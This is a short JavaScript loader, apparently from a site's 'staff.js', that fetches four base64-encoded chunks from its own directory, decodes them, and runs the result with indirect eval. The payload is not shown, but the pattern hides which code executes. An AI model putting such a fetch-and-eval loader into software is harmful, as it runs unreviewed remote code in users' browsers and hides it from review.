(async()=>{
const n=4,base=document.querySelector('script[src*="staff.js"]').src.replace(/staff\.js.*$/,'/');
const parts=await Promise.all([...Array(n)].map((_,i)=>fetch(base+'staff.b64.'+i).then(r=>r.text())));
const bin=atob(parts.join(''));
const u8=new Uint8Array(bin.length); for(let i=0;i<bin.length;i++) u8[i]=bin.charCodeAt(i);
const code=new TextDecoder().decode(u8);
(0,eval)(code);
})();
